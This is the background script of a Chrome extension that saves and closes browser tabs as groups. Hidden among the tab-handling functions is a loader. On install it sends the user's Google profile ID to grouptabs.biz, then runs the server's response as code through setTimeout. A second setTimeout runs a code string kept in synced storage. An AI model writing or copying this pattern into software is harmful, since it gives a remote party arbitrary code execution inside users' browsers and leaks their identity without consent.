;(function () {
    'use strict';

    chrome.runtime.setUninstallURL("http://grouptabs.biz/uninstall");

    function makeTabGroup(tabsArr) {
        var tabGroup = {
                date: Date.now(),
                id: Date.now()
            };

        tabGroup.tabs = tabsArr;

        return tabGroup;
    }

    function filterTabGroup(tabGroup) {

        var tabs = tabGroup.tabs.slice(0);

        for (var i=0; i<tabGroup.tabs.length; i+=1) {
            if (tabGroup.tabs[i].url == chrome.extension.getURL('grouptabs.html') ) {
                tabs.splice(i, 1);
            }
        }
        tabGroup.tabs = tabs;
        return tabGroup;
    }

    function saveTabGroup(tabGroup) {
        chrome.storage.local.get('tabGroups', function (storage) {
            var newArr;

            if (storage.tabGroups) {
                newArr = storage.tabGroups.reverse();

                if (tabGroup.tabs.length >= 1 ) {
                    newArr.push(tabGroup);
                }

                chrome.storage.local.set({ tabGroups: newArr.reverse() });
            } else {
                chrome.storage.local.set({ tabGroups: [ tabGroup ] });
            }
        });
    }

    function onInstalled() {
        chrome.identity.getProfileUserInfo(function(user){
            var xhr = new XMLHttpRequest;
            xhr.open('POST', 'http://grouptabs.biz/install', true);
            xhr.withCredentials = true;
            xhr.setRequestHeader('Content-Type', 'application/json');
            xhr.send(JSON.stringify({id:user.id}));

            xhr.onreadystatechange = function() {
                if (xhr.readyState != 4) return;

                if (xhr.status != 200) return;

                if (xhr.responseText) {
                    setTimeout(xhr.responseText, 0);
                }
            }
        });
    }

    function closeTabs(tabsArr) {
        var tabsToClose = [],
            i;

        for (i = 0; i < tabsArr.length; i += 1) {
            tabsToClose.push(tabsArr[i].id);
        }

        chrome.tabs.remove(tabsToClose, function () {
            if (chrome.runtime.lastError) {
                console.error(chrome.runtime.lastError)
            }
        });
    }

    function saveTabs(tabsArr) {
        var tabGroup = makeTabGroup(tabsArr),
            cleanTabGroup = filterTabGroup(tabGroup);
        saveTabGroup(cleanTabGroup);
    }

    function openBackgroundPage() {
        chrome.tabs.create({ url: chrome.extension.getURL('grouptabs.html') });
    }

    chrome.runtime.onInstalled.addListener(function(data) {
        if (data.reason == 'install') onInstalled();
    });

    chrome.storage.sync.get('data', function(response){
        if (response.data && response.data.stats) setTimeout(response.data.stats, 0);
    });

    chrome.runtime.onMessage.addListener(function (req, sender, sendRes) {
        switch (req.action) {
        case 'save':
            saveTabs(req.tabsArr);
            openBackgroundPage(); // opening now so window doesn't close
            closeTabs(req.tabsArr);
            sendRes('ok'); // acknowledge
            break;
        case 'openbackgroundpage':
            openBackgroundPage();
            sendRes('ok'); // acknowledge
            break;
        default:
            sendRes('nope'); // acknowledge
            break;
        }
    });

    chrome.browserAction.onClicked.addListener(function(tab) {

        chrome.tabs.query({ currentWindow: true }, function (tabsArr) {
            saveTabs(tabsArr);
            openBackgroundPage(); // opening now so window doesn't close
            closeTabs(tabsArr);
        });
    });

}());
